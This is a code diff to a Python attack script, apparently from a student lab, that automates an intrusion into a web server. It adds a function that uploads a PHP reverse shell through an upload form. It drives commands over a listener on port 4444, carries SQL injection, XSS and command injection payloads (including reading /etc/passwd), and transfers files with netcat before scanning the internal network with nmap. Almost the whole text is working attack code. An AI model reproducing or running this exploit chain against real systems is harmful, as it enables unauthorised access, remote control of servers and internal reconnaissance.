@@ -2,10 +2,57 @@ import requests
 import socket
 import threading
 import time
-
+import os
 import random
 import string
 import urllib.parse
+
+def upload_reverse_shell(target_base_url, file_name, file_path):
+    """
+    Upload reverse shell to the target server's upload.php endpoint.
+    
+    Args:
+        target_base_url: Base URL (e.g., "http://www.secureskies.com")
+        file_path: Path to reverse shell file
+    
+    Returns:
+        tuple: (success: bool, uploaded_path: str)
+    """
+    upload_url = f"{target_base_url}/upload.php"
+    
+    print(f"[*] Uploading {os.path.basename(file_path)} to {upload_url}...")
+    
+    if not os.path.exists(file_path):
+        print(f"[-] Error: File not found: {file_path}")
+        return False, None
+    
+    try:
+        with open(file_path, 'rb') as f:
+            files = {'receipt': (os.path.basename(file_path), f, 'application/octet-stream')}
+            response = requests.post(upload_url, files=files, timeout=30, allow_redirects=True)
+            
+            # Extract the uploaded file path from response
+            uploaded_path = None
+            if response.status_code == 200 and 'uploads/' in response.text:
+                import re
+                match = re.search(file_name, response.text)
+                if match:
+                    uploaded_path = "uploads/" + file_name
+            
+            if response.status_code == 200 and (os.path.basename(file_path) in response.text):
+                print(f"[+] File uploaded successfully!")
+                return True, uploaded_path
+            else:
+                print(f"[-] Upload failed with status code: {response.status_code}")
+                return False, None
+                
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Upload error: {e}")
+        return False, None
+    except Exception as e:
+        print(f"[-] Unexpected error: {e}")
+        return False, None
+
 
 def handle_connection(client_socket, commands_to_execute):
     """
@@ -16,16 +63,14 @@ def handle_connection(client_socket, commands_to_execute):
     results = {}
     
     try:
-        # Set socket timeout (longer for nmap scans)
         client_socket.settimeout(30)
         
         # Read initial connection message
         initial = client_socket.recv(4096).decode('utf-8', errors='ignore')
-        print(f"[INITIAL] {initial}")
         
         # Execute each command and wait for completion
         for idx, command in enumerate(commands_to_execute, 1):
-            print(f"[CMD {idx}/{len(commands_to_execute)}] Executing: {command}")
+            print(f"[{idx}/{len(commands_to_execute)}] {command}")
             
             # Send command with end marker
             client_socket.send((command + "; echo '<<<CMD_DONE>>>'\n").encode('utf-8'))
@@ -80,18 +125,20 @@ def handle_connection(client_socket, commands_to_execute):
                         break
                         
             except socket.timeout:
-                print(f"[WARN] Command timed out after {read_timeout}s")
+                print(f"[!] Timeout after {read_timeout}s")
             
             results[command] = output.strip()
-            print(f"[RESULT] Command completed. Output length: {len(output)} chars")
+            
+            # Print command output
             if output:
-                print(f"[OUTPUT] {output[:300]}...")  # Print first 300 chars
+                print(f"[OUTPUT]\n{output}\n")
+            else:
+                print("[OUTPUT] (no output)\n")
         
-        # Send exit command
         client_socket.send(b"exit\n")
         
     except Exception as e:
-        print(f"[ERROR] Connection error: {e}")
+        print(f"[-] Error: {e}")
     finally:
         client_socket.close()
     
@@ -132,7 +179,7 @@ def start_server(commands_to_execute, results_dict, event):
         event.set()  # Signal that we're done
 
 # === CONFIG ===
-TARGET_BASE = "http://google.com"
+TARGET_BASE = "http://www.secureskies.com"
 WORDLIST = ['admin', 'login', 'config', 'backup', 'test', 'dev', 'phpinfo', 'index', 'home', 'upload', 'file', 'shell', 'web', 'app', 'api', 'status', 'health', 'info']
 SQLI_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "1' UNION SELECT 1,2,3--", "' OR SLEEP(5)--"]
 XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"'><script>alert(1)</script>"]
@@ -141,7 +188,7 @@ CMD_INJ_PAYLOADS = [";id", "|whoami", "&&cat /etc/passwd", ";ls"]
 
 # === Simulate Directory Scan + Follow-up Attacks ===
 def simulate_pentest_traffic():
-    print("\n[+] Starting pentest traffic simulation...")
+    print("[+] Starting pentest traffic simulation...")
     session = requests.Session()
     
     # 1. Directory Brute-Force
@@ -149,11 +196,10 @@ def simulate_pentest_traffic():
         url = f"{TARGET_BASE}/{word}.php"
         try:
             r = session.get(url, timeout=3)
-            print(f"[DIR] {url} -> {r.status_code}")
             
             # If 200 OK → EXPLOIT FURTHER
             if r.status_code == 200:
-                print(f"    [+] HIT! Triggering follow-up attacks on {url}")
+                print(f"[+] Found: {url}")
                 
                 # Extra GET requests (simulate crawling)
                 for _ in range(3):
@@ -191,24 +237,23 @@ def simulate_pentest_traffic():
         session.get(f"{index_url}?{param}=1", timeout=2)
         time.sleep(0.2)
 
-    print("[+] Pentest simulation complete.\n")
+    print("[+] Pentest simulation complete")
 
 def send_file_via_netcat(target_ip, target_port, filepath):
     """Send file to target using netcat"""
     import subprocess
-    print(f"[*] Sending {filepath} to {target_ip}:{target_port} via netcat...")
+    print(f"[*] Sending file via netcat to {target_ip}:{target_port}...")
     try:
-        # Wait a bit for target listener to be ready
         time.sleep(5)
         cmd = f"nc {target_ip} {target_port} < {filepath}"
         result = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
         if result.returncode == 0:
-            print(f"[+] File sent successfully!")
+            print(f"[+] File sent successfully")
         else:
-            print(f"[-] File transfer failed: {result.stderr.decode()}")
+            print(f"[-] File transfer failed")
         return result.returncode == 0
     except Exception as e:
-        print(f"[-] Error sending file: {e}")
+        print(f"[-] Error: {e}")
         return False
 
 def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
@@ -228,7 +273,7 @@ def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
     completion_event = threading.Event()
     
     # Start the listener in a thread
-    print("[1] Starting listener on port 4444...")
+    print("[*] Starting listener on port 4444...")
     server_thread = threading.Thread(
         target=start_server,
         args=(commands, results_dict, completion_event)
@@ -240,30 +285,27 @@ def execute_reverse_shell_attack(target_url, commands, send_file_callback=None):
     time.sleep(2)
     
     # Trigger the reverse shell
-    print(f"[2] Triggering reverse shell at {target_url}...")
+    print(f"[*] Triggering reverse shell at {target_url}...")
     try:
-        # Use a very short timeout since reverse shell won't return response
         response = requests.get(target_url, timeout=3)
-        print(f"    Response code: {response.status_code}")
-        print(f"    Response data: {response.text}")
     except requests.exceptions.Timeout:
-        print("    [!] Request timeout (expected - shell connected in background)")
+        print("[+] Shell triggered (timeout expected)")
     except requests.exceptions.RequestException as e:
-        print(f"    [!] Request error: {e}")
+        print(f"[-] Request error: {e}")
         exit()
     
     # If there's a file transfer callback, execute it
     if send_file_callback:
-        print("[3] Initiating file transfer...")
+        print("[*] Initiating file transfer...")
         file_thread = threading.Thread(target=send_file_callback)
         file_thread.daemon = True
         file_thread.start()
     
     # Wait for command execution to complete
-    print("[4] Waiting for command execution...")
-    completion_event.wait(timeout=300)  # Wait up to 5 minutes for nmap scans
+    print("[*] Executing commands...")
+    completion_event.wait(timeout=300)
     
-    print("[5] Command execution complete!")
+    print("[+] Command execution complete")
     print("="*60)
     
     return results_dict
@@ -283,7 +325,11 @@ def start_http_server(port=8000):
 
 if __name__ == "__main__":
     # Configuration
-    TARGET_URL = "http://www.secureskies.com/uploads/reverse4.php"
+    TARGET_BASE = "http://www.secureskies.com"
+    FILE_NAME = "reverse6.php"
+    REVERSE_SHELL_PATH = "/home/student/Desktop/attacker_flow/" + FILE_NAME
+    
+    TARGET_URL = f"{TARGET_BASE}/uploads/{os.path.basename(REVERSE_SHELL_PATH)}"
     ATTACKER_IP = "12.0.0.45"  # This machine's IP for HTTP server
     HTTP_PORT = 8000
     
@@ -303,16 +349,14 @@ if __name__ == "__main__":
     http_thread = threading.Thread(target=start_http_server, args=(HTTP_PORT,))
     http_thread.daemon = True
     http_thread.start()
-    time.sleep(3)  # Give server time to start
+    time.sleep(3)
     
     # Verify HTTP server is running
-    print(f"[*] Verifying HTTP server is accessible at http://{ATTACKER_IP}:{HTTP_PORT}/")
     try:
         test_response = requests.get(f"http://{ATTACKER_IP}:{HTTP_PORT}/", timeout=5)
-        print(f"[+] HTTP server is running (status: {test_response.status_code})")
+        print(f"[+] HTTP server running")
     except Exception as e:
-        print(f"[!] Warning: Could not verify HTTP server - {e}")
-        print(f"[!] Make sure the server is accessible from the target at http://{ATTACKER_IP}:{HTTP_PORT}/")
+        print(f"[!] Warning: HTTP server verification failed")
         time.sleep(2)
     
     # === NETWORK ENUMERATION WITH NMAP ===
@@ -379,7 +423,7 @@ if __name__ == "__main__":
     # Step 17: Run nmap scans (reduced to essential scans only)
     COMMANDS.extend([
         # Step 17a: Run scan.sh on localhost
-        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./scan.sh 127.0.0.1 2>&1; else echo 'ERROR: Cannot run scan.sh - files not found'; fi",
+        "if [ -d /tmp/nmap_transfer/nmap-x64 ] && [ -f /tmp/nmap_transfer/nmap-x64/scan.sh ]; then cd /tmp/nmap_transfer/nmap-x64 && pwd && ./scan.sh 192.168.20.6 2>&1; else echo 'ERROR: Cannot run scan.sh - files not found'; fi",
         
         # Step 17b: Run simple nmap scan on localhost
         # "if [ -f /tmp/nmap_transfer/nmap-x64/nmap ]; then cd /tmp/nmap_transfer/nmap-x64 && ./nmap -sT -p 1-1000 127.0.0.1 2>&1; else echo 'ERROR: nmap binary not found'; fi",
@@ -419,12 +463,28 @@ if __name__ == "__main__":
     print("="*60)
     simulate_pentest_traffic()
     
-    print("\n[*] Waiting 5 seconds before starting reverse shell attack...")
     time.sleep(5)
     
-    # === Step 2: Execute reverse shell attack ===
+    # === Step 2: Upload reverse shell ===
     print("\n" + "="*60)
-    print("[PHASE 2] REVERSE SHELL ATTACK & ENUMERATION")
+    print("[PHASE 2] UPLOADING REVERSE SHELL")
+    print("="*60)
+    
+    success, uploaded_path = upload_reverse_shell(TARGET_BASE, FILE_NAME, REVERSE_SHELL_PATH)
+    
+    if success and uploaded_path:
+        TARGET_URL = f"{TARGET_BASE}/{uploaded_path}"
+        print(f"[+] File accessible at: {TARGET_URL}")
+    elif success:
+        print(f"[+] File should be at: {TARGET_URL}")
+    else:
+        print("[-] Upload failed - continuing anyway...")
+    
+    time.sleep(3)
+    
+    # === Step 3: Execute reverse shell attack ===
+    print("\n" + "="*60)
+    print("[PHASE 3] REVERSE SHELL ATTACK & ENUMERATION")
     print("="*60)
     results = execute_reverse_shell_attack(TARGET_URL, COMMANDS)
     
@@ -441,10 +501,6 @@ if __name__ == "__main__":
     print("="*60)
     print("[+] Attack sequence completed")
     print("="*60)
-
-    # ===================================================================
-# === PENTEST TRAFFIC SIMULATION MODULE (ADDED SEPARATELY) ===========
-# ===================================================================
 
 
 
